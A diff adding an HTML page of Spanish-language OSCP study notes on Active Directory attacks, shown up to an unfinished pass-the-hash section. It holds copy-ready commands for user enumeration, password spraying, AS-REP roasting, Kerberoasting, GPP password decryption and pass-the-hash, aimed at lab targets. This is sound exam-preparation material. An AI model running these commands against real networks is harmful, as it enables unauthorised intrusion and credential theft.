@@ -1,0 +1,857 @@
+<meta name="claude:viewport-fit-sides" content="cover">
+<title>AD de Inicio a Fin</title>
+<style>
+:root{
+  --bg:#f4f5f7; --panel:#ffffff; --panel-2:#eceef2; --fg:#1b1f27; --muted:#5b6270;
+  --line:#d8dce3; --accent:#c2621a; --accent-soft:#f3e2d2;
+  --code-bg:#1c2128; --code-fg:#e4e8ee;
+  --good:#1f7a4d; --warn:#9a6a00; --crit:#b2302b; --info:#2563a8;
+  --mono:"JetBrains Mono",ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  --sans:"Inter",system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#0f1319; --panel:#161b22; --panel-2:#1c222b; --fg:#e6e9ee; --muted:#8b94a3;
+  --line:#2a313b; --accent:#e08c42; --accent-soft:#2a2016;
+  --code-bg:#0b0e13; --code-fg:#dbe2ea;
+  --good:#52c08a; --warn:#d8a43a; --crit:#f0756e; --info:#6aa8e8; color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#0f1319; --panel:#161b22; --panel-2:#1c222b; --fg:#e6e9ee; --muted:#8b94a3;
+  --line:#2a313b; --accent:#e08c42; --accent-soft:#2a2016;
+  --code-bg:#0b0e13; --code-fg:#dbe2ea;
+  --good:#52c08a; --warn:#d8a43a; --crit:#f0756e; --info:#6aa8e8; color-scheme:dark;
+}
+*{box-sizing:border-box}
+html{scroll-padding-top:env(safe-area-inset-top,0px)}
+body{background:var(--bg);color:var(--fg);font-family:var(--sans);line-height:1.55;margin:0;font-size:15px}
+a{color:var(--accent)}
+img{max-width:100%}
+.wrap{display:grid;grid-template-columns:286px minmax(0,1fr);gap:0;max-width:1480px;margin:0 auto}
+.nav{position:sticky;top:env(safe-area-inset-top,0px);align-self:start;height:100dvh;overflow-y:auto;
+  border-right:1px solid var(--line);background:var(--panel);
+  padding:20px max(14px,env(safe-area-inset-left,0px)) 40px 14px}
+.brand{font-weight:800;font-size:16px;letter-spacing:.3px;display:flex;align-items:center;gap:8px;margin-bottom:4px}
+.brand .dot{width:9px;height:9px;border-radius:50%;background:var(--accent);box-shadow:0 0 0 3px var(--accent-soft);flex:none}
+.brand small{display:block;color:var(--muted);font-weight:500;font-size:11px;letter-spacing:0}
+.search{width:100%;margin:14px 0;padding:9px 11px;border:1px solid var(--line);border-radius:8px;
+  background:var(--panel-2);color:var(--fg);font-family:var(--sans);font-size:13px}
+.search:focus{outline:2px solid var(--accent);outline-offset:1px}
+.nav ul{list-style:none;margin:0;padding:0}
+.nav li a{display:block;padding:6px 10px;border-radius:7px;color:var(--muted);text-decoration:none;
+  font-size:13px;font-weight:500;border-left:2px solid transparent}
+.nav li a:hover{background:var(--panel-2);color:var(--fg)}
+.nav li a.active{color:var(--accent);background:var(--accent-soft);border-left-color:var(--accent);font-weight:600}
+.nav .grp{font-size:10.5px;text-transform:uppercase;letter-spacing:1px;color:var(--muted);
+  margin:16px 0 4px 10px;font-weight:700;opacity:.8}
+.nav .pos a{font-variant-numeric:tabular-nums}
+.main{padding:28px max(18px,env(safe-area-inset-right,0px)) 80px max(18px,env(safe-area-inset-left,0px));min-width:0}
+header.top{margin-bottom:8px}
+header.top h1{font-size:28px;margin:0 0 6px;text-wrap:balance;letter-spacing:-.3px}
+header.top p{color:var(--muted);margin:0;max-width:66ch}
+.mantra{margin:18px 0;padding:14px 16px;border:1px solid var(--line);border-left:3px solid var(--accent);
+  border-radius:8px;background:var(--panel);font-weight:600}
+.mantra span{color:var(--accent)}
+section{margin:30px 0;scroll-margin-top:16px}
+section>h2{font-size:21px;margin:0 0 4px;padding-bottom:7px;border-bottom:2px solid var(--line);
+  display:flex;align-items:center;gap:9px;letter-spacing:-.2px}
+section>h2 .n{font-family:var(--mono);font-size:13px;color:var(--accent);background:var(--accent-soft);
+  padding:2px 8px;border-radius:6px;font-weight:700;flex:none}
+.lead{color:var(--muted);max-width:68ch;margin:6px 0 2px}
+h3{font-size:16px;margin:22px 0 6px;color:var(--fg)}
+h4{font-size:13.5px;margin:16px 0 4px;color:var(--muted);text-transform:uppercase;letter-spacing:.6px}
+p{margin:6px 0;max-width:72ch}
+ul.notes{margin:8px 0;padding-left:20px;max-width:72ch}
+ul.notes li{margin:3px 0}
+.why{font-size:14px;margin:6px 0;max-width:72ch}
+.why b{color:var(--fg)}
+.code{position:relative;background:var(--code-bg);border-radius:9px;margin:9px 0;border:1px solid var(--line)}
+.code pre{margin:0;padding:12px 70px 12px 14px;overflow-x:auto;font-family:var(--mono);font-size:12.5px;
+  line-height:1.55;color:var(--code-fg);white-space:pre}
+.code .cmt{color:#7f8a99}
+.code button.cp{position:absolute;top:7px;right:7px;border:1px solid #3a434f;background:#222932;color:#c9d2dd;
+  border-radius:6px;font-size:11px;padding:3px 8px;cursor:pointer;font-family:var(--sans);opacity:.75}
+.code button.cp:hover{opacity:1;border-color:var(--accent);color:var(--accent)}
+.code button.cp.ok{color:var(--good);border-color:var(--good)}
+.tbl{overflow-x:auto;margin:10px 0;border:1px solid var(--line);border-radius:9px}
+table{border-collapse:collapse;width:100%;font-size:13px;min-width:460px}
+th,td{text-align:left;padding:8px 11px;border-bottom:1px solid var(--line);vertical-align:top}
+th{background:var(--panel-2);font-weight:700;font-size:12px;text-transform:uppercase;letter-spacing:.4px}
+td code,p code,li code,.why code{font-family:var(--mono);font-size:12px;background:var(--panel-2);padding:1px 5px;border-radius:4px}
+tr:last-child td{border-bottom:none}
+.pos-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:10px;margin:14px 0}
+.pos-card{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:12px 14px;
+  border-top:3px solid var(--accent);text-decoration:none;color:inherit;display:block}
+.pos-card:hover{border-color:var(--accent)}
+.pos-card .pn{font-family:var(--mono);font-size:11px;color:var(--accent);font-weight:700}
+.pos-card .pt{font-weight:700;font-size:14px;margin:3px 0;color:var(--fg)}
+.pos-card .pd{font-size:12.5px;color:var(--muted)}
+.callout{border-radius:9px;padding:11px 14px;margin:12px 0;border:1px solid var(--line);font-size:13.5px;max-width:74ch}
+.callout.good{border-left:3px solid var(--good)}
+.callout.warn{border-left:3px solid var(--warn)}
+.callout.crit{border-left:3px solid var(--crit)}
+.callout.info{border-left:3px solid var(--info)}
+.callout b{color:var(--fg)}
+.pills{display:flex;flex-wrap:wrap;gap:6px;margin:10px 0}
+.pill{font-size:11px;font-weight:600;padding:3px 9px;border-radius:999px;border:1px solid var(--line);background:var(--panel-2)}
+.next{display:flex;flex-wrap:wrap;gap:6px;align-items:center;font-size:13px;margin:12px 0;
+  background:var(--panel);border:1px solid var(--line);border-left:3px solid var(--good);border-radius:9px;padding:10px 13px}
+.next b{color:var(--good)}
+.k{font-family:var(--mono);font-size:12px;color:var(--accent)}
+.menu-btn{display:none}
+@media(max-width:860px){
+  .wrap{grid-template-columns:1fr}
+  .nav{position:fixed;z-index:40;top:0;left:0;width:84%;max-width:300px;height:100dvh;
+    transform:translateX(-102%);transition:transform .22s ease;
+    box-shadow:0 0 0 100vmax rgba(0,0,0,0);padding-top:max(20px,env(safe-area-inset-top,0px))}
+  .nav.open{transform:translateX(0);box-shadow:0 0 0 100vmax rgba(0,0,0,.45)}
+  .menu-btn{display:inline-flex;position:fixed;z-index:50;top:max(10px,env(safe-area-inset-top,0px));
+    left:12px;align-items:center;gap:7px;background:var(--panel);border:1px solid var(--line);
+    color:var(--fg);border-radius:9px;padding:8px 12px;font-weight:700;font-size:13px;cursor:pointer}
+  .main{padding-top:58px}
+}
+.theme-t{margin-top:18px;font-size:12px;color:var(--muted);background:none;border:1px solid var(--line);
+  border-radius:7px;padding:6px 10px;cursor:pointer}
+.hidden-s{display:none!important}
+.foot{margin-top:40px;padding-top:16px;border-top:1px solid var(--line);color:var(--muted);font-size:12px;max-width:74ch}
+</style>
+<button class="menu-btn" id="mbtn">☰ Índice</button>
+<div class="wrap">
+<nav class="nav" id="nav">
+  <div class="brand"><span class="dot"></span><div>Active Directory<small>Study notes OSCP · de inicio a fin</small></div></div>
+  <input class="search" id="search" placeholder="Buscar comando o técnica…" autocomplete="off">
+  <div class="grp">Empieza aquí</div>
+  <ul>
+    <li><a href="#como-usar">Cómo usar estas notas</a></li>
+    <li><a href="#framework">El framework de 9 posiciones</a></li>
+    <li><a href="#vars">Variables y setup</a></li>
+  </ul>
+  <div class="grp">Las 9 posiciones</div>
+  <ul class="pos">
+    <li><a href="#p1">1 · Solo IP, sin nada</a></li>
+    <li><a href="#p2">2 · Lista de usuarios</a></li>
+    <li><a href="#p3">3 · 1 credencial</a></li>
+    <li><a href="#p4">4 · Hash NTLM</a></li>
+    <li><a href="#p5">5 · Shell de usuario</a></li>
+    <li><a href="#p6">6 · Admin local / SYSTEM</a></li>
+    <li><a href="#p7">7 · ACL sobre un objeto</a></li>
+    <li><a href="#p8">8 · Servicio con contexto</a></li>
+    <li><a href="#p9">9 · Privilegio de dominio</a></li>
+  </ul>
+  <div class="grp">Transversal</div>
+  <ul>
+    <li><a href="#lateral">Movimiento lateral y acceso</a></li>
+    <li><a href="#pivoting">Pivoting y tunneling</a></li>
+    <li><a href="#persist">Post-explotación del DC</a></li>
+  </ul>
+  <div class="grp">Rescate</div>
+  <ul>
+    <li><a href="#atascado">Cuando algo no funciona</a></li>
+    <li><a href="#examen">Gestión del examen (AD)</a></li>
+  </ul>
+  <button class="theme-t" id="theme">Cambiar tema claro / oscuro</button>
+</nav>
+<main class="main">
+<header class="top">
+  <h1>Active Directory de inicio a fin</h1>
+  <p>Notas de estudio para la parte de AD del OSCP. No es una lista seca de comandos: cada técnica dice <b>qué</b> hace y <b>por qué</b> la usas, con el comando listo para copiar debajo. Todo está ordenado por el framework de 9 posiciones, para que cuando te quedes pegado la pregunta no sea "¿qué exploit uso?" sino "¿en qué posición estoy?".</p>
+</header>
+
+<div class="mantra">La pregunta correcta nunca es <span>«¿qué exploit me falta?»</span> — es <span>«¿en qué posición estoy y qué ataques tiene esa posición?»</span>. Si una posición no avanza, casi siempre te saltaste un ataque de su propia lista.</div>
+
+<!-- ============ CÓMO USAR ============ -->
+<section id="como-usar">
+<h2><span class="n">00</span>Cómo usar estas notas</h2>
+<p class="lead">AD en el OSCP no es romper una máquina suelta: es una cadena. Consigues algo (un usuario, una credencial, un hash, una shell), eso te mueve a otra posición, y cada posición tiene un conjunto fijo de ataques. Avanzar es moverte de posición en posición hasta llegar al Domain Controller.</p>
+<ul class="notes">
+  <li><b>Identifica tu posición</b> con el framework de abajo. Es una de nueve, más una "posición transversal" (no llegas al DC por red → monta un túnel).</li>
+  <li><b>Ataca toda la lista de esa posición</b> en orden, sin saltarte pasos. El 90% de los atascos son un paso omitido, no una técnica exótica.</li>
+  <li><b>Cada botín te reubica.</b> Consigues un hash → ahora estás en la Posición 4. Consigues shell → Posición 5. Vuelve a mirar el framework cada vez.</li>
+  <li><b>Toma notas y screenshots de TODO</b> a medida que avanzas (comando + salida). La parte de AD es todo-o-nada por cadena; si llegas al DC pero no documentaste el camino, pierdes puntos.</li>
+</ul>
+<div class="callout info"><b>Convención de estas notas:</b> uso variables de shell (<code>$IP</code>, <code>$DC</code>, <code>$DOMAIN</code>, <code>$USER</code>, <code>$PASS</code>, <code>$HASH</code>) para que puedas copiar el comando y solo ajustar las variables una vez (ver <a href="#vars">Variables y setup</a>). Las herramientas son las del toolkit estándar de Kali: <code>nxc</code> es NetExec (el sucesor de CrackMapExec; si tu caja aún trae <code>crackmapexec</code>, los flags son idénticos).</div>
+</section>
+
+<!-- ============ FRAMEWORK ============ -->
+<section id="framework">
+<h2><span class="n">01</span>El framework de 9 posiciones</h2>
+<p class="lead">Este es el mapa. Pincha la posición en la que estás y salta directo a sus ataques.</p>
+<div class="pos-grid">
+  <a class="pos-card" href="#p1"><div class="pn">POSICIÓN 1</div><div class="pt">Solo IP / red</div><div class="pd">Ni usuarios ni credenciales. Objetivo: conseguir una LISTA de usuarios.</div></a>
+  <a class="pos-card" href="#p2"><div class="pn">POSICIÓN 2</div><div class="pt">Lista de usuarios</div><div class="pd">Usuarios sí, contraseñas no. AS-REP roasting, spraying, user=pass.</div></a>
+  <a class="pos-card" href="#p3"><div class="pn">POSICIÓN 3</div><div class="pt">1 credencial de dominio</div><div class="pd">BloodHound → Kerberoasting → shares/LDAP → ¿admin en algún host?</div></a>
+  <a class="pos-card" href="#p4"><div class="pn">POSICIÓN 4</div><div class="pt">Un hash NTLM</div><div class="pd">Pass-the-Hash, overpass-the-hash, nxc para ver dónde es admin.</div></a>
+  <a class="pos-card" href="#p5"><div class="pn">POSICIÓN 5</div><div class="pt">Shell de usuario</div><div class="pd">Privesc local: SeImpersonate, DPAPI, historial PS, winPEAS.</div></a>
+  <a class="pos-card" href="#p6"><div class="pn">POSICIÓN 6</div><div class="pt">Admin local / SYSTEM</div><div class="pd">SAM/SYSTEM, lsass, LAPS, SeBackup+robocopy, creds cacheadas.</div></a>
+  <a class="pos-card" href="#p7"><div class="pn">POSICIÓN 7</div><div class="pt">ACL sobre un objeto</div><div class="pd">Edges de BloodHound: GenericAll, WriteDacl, AddMember, Shadow Creds.</div></a>
+  <a class="pos-card" href="#p8"><div class="pn">POSICIÓN 8</div><div class="pt">Servicio con contexto</div><div class="pd">MSSQL → xp_cmdshell, AD CS (ESC1-8), app web con creds.</div></a>
+  <a class="pos-card" href="#p9"><div class="pn">POSICIÓN 9</div><div class="pt">Privilegio de dominio</div><div class="pd">DCSync, Golden/Silver Ticket, PtT, abuso de delegación.</div></a>
+</div>
+<div class="callout good"><b>Posición transversal (puede darse en cualquier punto):</b> ¿el DC o una segunda subred no se alcanzan desde tu Kali? No es una posición nueva, es un bloqueo de red. Monta un <a href="#pivoting">túnel</a> y sigues atacando desde donde estabas, pero ahora alcanzando la red interna.</div>
+</section>
+
+<!-- ============ VARIABLES ============ -->
+<section id="vars">
+<h2><span class="n">02</span>Variables y setup</h2>
+<p class="why">Define esto una vez al empezar la máquina de AD y reutiliza las variables en todos los comandos. Ahorra errores de tipeo y hace los screenshots más limpios.</p>
+<div class="code"><pre>export IP=10.10.10.10          <span class="cmt"># IP del host objetivo actual</span>
+export DC=10.10.10.10          <span class="cmt"># IP del Domain Controller</span>
+export DOMAIN=corp.local       <span class="cmt"># nombre del dominio (FQDN)</span>
+export DCHOST=dc01.corp.local  <span class="cmt"># hostname del DC (para Kerberos)</span>
+export USER=jdoe
+export PASS='Verano2025!'
+export HASH=aad3b435b51404eeaad3b435b51404ee:<span class="cmt">NTHASH</span>   <span class="cmt"># LM:NT, o solo :NT</span></pre></div>
+<h4>Imprescindible: /etc/hosts y reloj</h4>
+<p class="why">Kerberos trabaja con <b>nombres</b>, no IPs, y es estricto con el reloj. Mapea el DC en <code>/etc/hosts</code> y sincroniza la hora <b>antes</b> de tocar nada de Kerberos, o verás errores de "clock skew" / "KRB_AP_ERR_SKEW".</p>
+<div class="code"><pre><span class="cmt"># añade DC y dominio a /etc/hosts</span>
+echo "$DC $DCHOST $DOMAIN dc01" | sudo tee -a /etc/hosts
+
+<span class="cmt"># sincroniza tu reloj con el DC (clave para Kerberos)</span>
+sudo timedatectl set-ntp off
+sudo ntpdate $DC            <span class="cmt"># o: sudo rdate -n $DC</span>
+<span class="cmt"># alternativa moderna: sudo nxc smb $DC --generate-hosts-file /tmp/hosts</span></pre></div>
+</section>
+
+<!-- ============ POSICIÓN 1 ============ -->
+<section id="p1">
+<h2><span class="n">P1</span>Posición 1 · Solo IP, sin usuarios ni credenciales</h2>
+<p class="lead"><b>Señal:</b> acabas de identificar el DC (puertos 88/389/445 abiertos). No tienes ni un usuario. <b>Objetivo único:</b> conseguir una LISTA de nombres de usuario válidos. Casi todo lo demás en AD depende de tener esa lista.</p>
+
+<h3>Reconocimiento de puertos</h3>
+<p class="why">Un DC se delata por su combinación de puertos: <b>88</b> (Kerberos), <b>389/636</b> (LDAP/LDAPS), <b>445</b> (SMB), <b>5985</b> (WinRM). Escanea completo y deja que nmap te extraiga el dominio y el hostname de los certificados y de SMB.</p>
+<div class="code"><pre>nmap -p- --min-rate 2000 -Pn $IP -oN nmap-full.txt
+nmap -p 53,88,135,139,389,445,464,636,3268,3389,5985,9389 -sCV $IP -oN nmap-ad.txt
+<span class="cmt"># nmap te revela el dominio y el FQDN del DC en la salida de LDAP/SMB/RDP</span></pre></div>
+
+<h3>SMB sin credenciales (null session / guest)</h3>
+<p class="why">Antes de nada prueba sesión nula y usuario <code>guest</code>. Si cualquiera funciona, a veces puedes listar shares y hasta enumerar usuarios del dominio sin tener una sola credencial.</p>
+<div class="code"><pre>nxc smb $IP                       <span class="cmt"># firma: dominio, hostname, SMBv1, signing</span>
+nxc smb $IP -u '' -p ''           <span class="cmt"># null session</span>
+nxc smb $IP -u 'guest' -p ''      <span class="cmt"># cuenta guest</span>
+nxc smb $IP -u '' -p '' --shares  <span class="cmt"># ¿shares legibles sin login?</span>
+nxc smb $IP -u 'guest' -p '' --rid-brute 10000   <span class="cmt"># enumera usuarios por RID</span>
+smbclient -L //$IP/ -N           <span class="cmt"># listar shares anónimo</span>
+smbclient //$IP/Share -N         <span class="cmt"># conectar a un share anónimo</span></pre></div>
+
+<h3>RPC y enum4linux-ng</h3>
+<p class="why"><code>rpcclient</code> por sesión nula puede volcar usuarios, grupos y la política de contraseñas (vital para saber el umbral de bloqueo antes de hacer spraying). <code>enum4linux-ng</code> automatiza todo esto en un solo comando.</p>
+<div class="code"><pre>rpcclient -U '' -N $IP
+<span class="cmt"># dentro de rpcclient:</span>
+  enumdomusers        <span class="cmt"># lista usuarios + sus RIDs</span>
+  enumdomgroups
+  querydominfo
+  getdompwinfo        <span class="cmt"># política de contraseñas / lockout</span>
+  queryuser 0x450     <span class="cmt"># detalle de un usuario por RID</span>
+  lookupnames jdoe
+
+<span class="cmt"># todo de una, automatizado:</span>
+enum4linux-ng -A $IP
+enum4linux-ng -A -u '' -p '' $IP</pre></div>
+
+<h3>LDAP anónimo</h3>
+<p class="why">Algunos DCs permiten binds LDAP anónimos. Si es el caso, extraes el naming context, usuarios y descripciones directamente. Las <code>description</code> de las cuentas a veces guardan contraseñas (ver Posición 3).</p>
+<div class="code"><pre><span class="cmt"># naming context base (sirve para armar el DN)</span>
+ldapsearch -x -H ldap://$IP -s base namingcontexts
+
+<span class="cmt"># volcar usuarios (ajusta el DC= al dominio)</span>
+ldapsearch -x -H ldap://$IP -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description
+
+<span class="cmt"># windapsearch: más cómodo para listar usuarios/equipos</span>
+windapsearch -d $DOMAIN --dc-ip $DC -U
+windapsearch -d $DOMAIN --dc-ip $DC --computers</pre></div>
+
+<h3>Enumeración de usuarios por Kerberos (kerbrute)</h3>
+<p class="why">Cuando SMB/LDAP/RPC están cerrados, Kerberos (88) casi nunca lo está. <code>kerbrute userenum</code> pregunta al DC por cada nombre de una wordlist y te dice cuáles existen <b>sin generar logins fallidos</b> (no bloquea cuentas). Es la forma más fiable de construir la lista de usuarios desde cero.</p>
+<div class="code"><pre>kerbrute userenum -d $DOMAIN --dc $DC /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+<span class="cmt"># listas útiles de nombres:</span>
+<span class="cmt">#   /usr/share/seclists/Usernames/Names/names.txt</span>
+<span class="cmt"># genera candidatos desde nombres reales (web, PDF metadata, etc.):</span>
+<span class="cmt">#   username-anarchy -i nombres.txt   →  jdoe, john.doe, j.doe, doej...</span></pre></div>
+
+<h3>DNS del dominio</h3>
+<p class="why">El DC suele ser también el DNS. Un volcado de zona o consultas de registros SRV te dan hostnames internos (otros servidores, nombres de servicio) que amplían la superficie.</p>
+<div class="code"><pre>dig @$DC $DOMAIN any
+dig axfr @$DC $DOMAIN                      <span class="cmt"># transferencia de zona (si está mal configurada)</span>
+nslookup -type=SRV _ldap._tcp.dc._msdcs.$DOMAIN $DC</pre></div>
+
+<div class="next"><b>¿Qué conseguí?</b> Una lista de usuarios → vas a la <a href="#p2">Posición 2</a>. &nbsp;·&nbsp; ¿Una credencial de una web/share? → <a href="#p3">Posición 3</a>. &nbsp;·&nbsp; ¿El DC no responde desde Kali? → <a href="#pivoting">monta un túnel</a>.</div>
+</section>
+
+<!-- ============ POSICIÓN 2 ============ -->
+<section id="p2">
+<h2><span class="n">P2</span>Posición 2 · Tengo lista de usuarios, ninguna contraseña</h2>
+<p class="lead"><b>Objetivo:</b> convertir un nombre de usuario en una credencial o un hash crackeable. Tres ataques, en este orden: AS-REP roasting (gratis, no necesita nada más), luego password spraying, y de paso prueba usuario=contraseña.</p>
+
+<h3>AS-REP Roasting</h3>
+<p class="why">Las cuentas con <b>"Do not require Kerberos preauthentication"</b> activado te entregan un blob cifrado con su contraseña <b>sin que tengas que autenticarte</b>. Lo pides, lo crackeas offline con hashcat. Pruébalo siempre: es gratis y no bloquea cuentas.</p>
+<div class="code"><pre><span class="cmt"># pedir AS-REP de toda tu lista de usuarios (sin contraseña)</span>
+impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC -format hashcat -outputfile asrep.txt
+
+<span class="cmt"># si ya tienes 1 credencial, pide la de TODO el dominio de golpe:</span>
+impacket-GetNPUsers $DOMAIN/$USER:$PASS -request -dc-ip $DC -format hashcat
+
+<span class="cmt"># con nxc:</span>
+nxc ldap $DC -u users.txt -p '' --asreproast asrep.txt
+
+<span class="cmt"># crackear (modo 18200 = AS-REP)</span>
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt</pre></div>
+
+<h3>Password Spraying</h3>
+<p class="why">En vez de muchas contraseñas contra un usuario (bloquea), pruebas <b>una</b> contraseña plausible contra <b>todos</b> los usuarios. Mira primero la política de lockout (Posición 1) para no bloquear el dominio. <code>kerbrute passwordspray</code> es el más silencioso porque no deja logins fallidos de red.</p>
+<div class="code"><pre><span class="cmt"># contraseñas plausibles: Estación+año, NombreEmpresa123!, Welcome1, Password1...</span>
+kerbrute passwordspray -d $DOMAIN --dc $DC users.txt 'Otono2025!'
+
+<span class="cmt"># con nxc (añade --continue-on-success para ver todos los aciertos)</span>
+nxc smb $DC -u users.txt -p 'Otono2025!' --continue-on-success
+nxc smb $DC -u users.txt -p passwords.txt --no-bruteforce   <span class="cmt"># empareja línea a línea</span>
+
+<span class="cmt"># prueba usuario=contraseña (sorprendentemente común en labs/examen)</span>
+nxc smb $DC -u users.txt -p users.txt --no-bruteforce --continue-on-success</pre></div>
+<div class="callout warn"><b>Cuidado con el lockout.</b> Si la política bloquea a los 5 intentos, haz spraying de una sola contraseña y espera la ventana de reset antes de la siguiente. En el examen, bloquear la cuenta de un usuario objetivo puede costarte horas.</div>
+
+<div class="next"><b>¿Qué conseguí?</b> Una credencial (user:pass) → <a href="#p3">Posición 3</a>. &nbsp;·&nbsp; Un hash AS-REP/Kerberos que crackeaste → también Posición 3 con esa cred.</div>
+</section>
+
+<!-- ============ POSICIÓN 3 ============ -->
+<section id="p3">
+<h2><span class="n">P3</span>Posición 3 · Tengo 1 credencial de dominio</h2>
+<p class="lead"><b>Esta es la posición más rica.</b> Una credencial válida abre la enumeración completa. Orden recomendado: <b>BloodHound</b> (el mapa) → <b>Kerberoasting</b> → <b>cazar más credenciales</b> en shares/LDAP → ver <b>dónde eres admin</b>. No te saltes BloodHound: te dice el camino más corto al DC.</p>
+
+<h3>Validar la credencial y ver dónde sirve</h3>
+<p class="why">Antes de enumerar, confirma que la cred es válida y comprueba de un vistazo en qué hosts tiene acceso (y si en alguno es admin local — marca <code>(Pwn3d!)</code>).</p>
+<div class="code"><pre>nxc smb $DC -u $USER -p $PASS                 <span class="cmt"># [+] válida</span>
+nxc smb 10.10.10.0/24 -u $USER -p $PASS      <span class="cmt"># barre la subred; busca (Pwn3d!)</span>
+nxc winrm 10.10.10.0/24 -u $USER -p $PASS    <span class="cmt"># ¿WinRM en algún host?</span></pre></div>
+
+<h3>BloodHound — el mapa del dominio</h3>
+<p class="why">BloodHound recolecta usuarios, grupos, sesiones y ACLs, y dibuja el <b>camino más corto</b> desde donde estás hasta Domain Admin. Es lo que convierte "no sé qué hacer" en "este usuario tiene GenericAll sobre este grupo". Recolecta con <code>bloodhound-python</code> (desde Kali, sin tocar el objetivo) y analiza en la GUI.</p>
+<div class="code"><pre><span class="cmt"># recolector remoto (no necesita shell en Windows)</span>
+bloodhound-python -d $DOMAIN -u $USER -p $PASS -ns $DC -c all --zip
+
+<span class="cmt"># si falla por DNS: añade -dc $DCHOST y asegúrate del /etc/hosts</span>
+<span class="cmt"># alternativa con nxc (módulo bloodhound):</span>
+nxc ldap $DC -u $USER -p $PASS --bloodhound --collection all -ns $DC
+
+<span class="cmt"># levantar la GUI (BloodHound CE)</span>
+sudo bloodhound-ce up      <span class="cmt"># o la versión legacy: neo4j console + bloodhound</span></pre></div>
+<div class="callout info"><b>Qué mirar en BloodHound:</b> marca tu usuario como <b>Owned</b>, usa "Shortest paths to Domain Admins" y "Outbound Object Control". Las aristas (edges) GenericAll, GenericWrite, WriteDacl, AddMember, ForceChangePassword y AddKeyCredentialLink son tu <a href="#p7">Posición 7</a>.</div>
+
+<h3>Kerberoasting</h3>
+<p class="why">Las cuentas de servicio con un <b>SPN</b> registrado (típicamente <code>SVC_*</code>, <code>MSSQL*</code>) te entregan un ticket TGS cifrado con el hash de su contraseña. Lo pides con una cred válida y lo crackeas offline. Las cuentas de servicio suelen tener contraseñas débiles y fijas → muy rentable.</p>
+<div class="code"><pre>impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC -request -outputfile kerb.txt
+
+<span class="cmt"># con nxc:</span>
+nxc ldap $DC -u $USER -p $PASS --kerberoasting kerb.txt
+
+<span class="cmt"># crackear (modo 13100 = TGS-REP Kerberos)</span>
+hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt</pre></div>
+
+<h3>PowerView (enumeración desde una shell Windows)</h3>
+<p class="why">Si ya tienes una shell en un host del dominio, PowerView enumera desde dentro sin herramientas externas. Útil para confirmar lo de BloodHound y para buscar cosas puntuales (quién es admin de qué, descripciones, delegación).</p>
+<div class="code"><pre>. .\PowerView.ps1
+Get-NetUser | select samaccountname,description
+Get-NetUser -SPN | select samaccountname,serviceprincipalname   <span class="cmt"># cuentas kerberoasteable</span>
+Get-NetGroup "Domain Admins" -MemberName
+Find-LocalAdminAccess                 <span class="cmt"># ¿dónde soy admin local?</span>
+Get-NetComputer -Unconstrained        <span class="cmt"># delegación sin restricción</span>
+Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll"}</pre></div>
+
+<h3>Cazar más credenciales (shares, GPP, descripciones)</h3>
+<p class="why">Con una cred puedes leer shares. Ahí viven contraseñas en scripts, archivos de config, <code>web.config</code>, y sobre todo el clásico <b>GPP cpassword</b> en SYSVOL (cifrado con una clave pública conocida → descifrable). También revisa el campo <code>description</code> de cada usuario.</p>
+<div class="code"><pre><span class="cmt"># spider automático de todos los shares buscando patrones de credenciales</span>
+nxc smb $IP -u $USER -p $PASS -M spider_plus
+nxc smb $IP -u $USER -p $PASS --shares
+
+<span class="cmt"># GPP cpassword en SYSVOL (Groups.xml, Services.xml...)</span>
+nxc smb $DC -u $USER -p $PASS -M gpp_password
+<span class="cmt"># manual: buscar y descifrar</span>
+smbclient //$DC/SYSVOL -U "$DOMAIN/$USER%$PASS"
+gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhUoDPk"
+
+<span class="cmt"># contraseñas en el campo description de las cuentas</span>
+nxc ldap $DC -u $USER -p $PASS -M get-desc-users
+<span class="cmt"># manual:</span>
+ldapsearch -x -H ldap://$DC -D "$USER@$DOMAIN" -w "$PASS" -b "DC=corp,DC=local" "(description=*)" sAMAccountName description</pre></div>
+
+<div class="next"><b>¿Qué conseguí?</b> Cred de otra cuenta → repites P3 con ella. &nbsp;·&nbsp; Un hash NTLM → <a href="#p4">Posición 4</a>. &nbsp;·&nbsp; Admin local en un host (<code>Pwn3d!</code>) → <a href="#lateral">entra</a> y pasa a <a href="#p6">Posición 6</a>. &nbsp;·&nbsp; Un edge en BloodHound → <a href="#p7">Posición 7</a>.</div>
+</section>
+
+<!-- ============ POSICIÓN 4 ============ -->
+<section id="p4">
+<h2><span class="n">P4</span>Posición 4 · Tengo un hash NTLM, no la contraseña</h2>
+<p class="lead">Un hash NTLM vale casi lo mismo que la contraseña: con Kerberos/NTLM puedes autenticarte directamente. <b>Objetivo:</b> ver dónde ese hash es admin, entrar por Pass-the-Hash, y de paso intentar crackearlo por si se reutiliza en otro sitio.</p>
+
+<h3>¿Dónde es admin este hash? (barrido)</h3>
+<p class="why">Un hash de una cuenta local (p.ej. el Administrator local sacado de SAM) puede estar reutilizado en varios equipos. Barre la subred con el hash para encontrar dónde da <code>(Pwn3d!)</code>.</p>
+<div class="code"><pre>nxc smb 10.10.10.0/24 -u Administrator -H $HASH --local-auth    <span class="cmt"># cuenta LOCAL</span>
+nxc smb 10.10.10.0/24 -u $USER -H $HASH                          <span class="cmt"># cuenta de DOMINIO</span>
+nxc winrm 10.10.10.0/24 -u $USER -H $HASH</pre></div>
+
+<h3>Pass-the-Hash (entrar con el hash)</h3>
+<p class="why">Pasas el hash NTLM en vez de la contraseña. Funciona con evil-winrm, psexec, wmiexec, etc. El formato es <code>LMHASH:NTHASH</code>; si solo tienes el NT, antepón <code>aad3b435b51404eeaad3b435b51404ee:</code> o deja los dos puntos iniciales.</p>
+<div class="code"><pre><span class="cmt"># WinRM (5985) — el más cómodo si tienes acceso</span>
+evil-winrm -i $IP -u $USER -H NTHASH
+
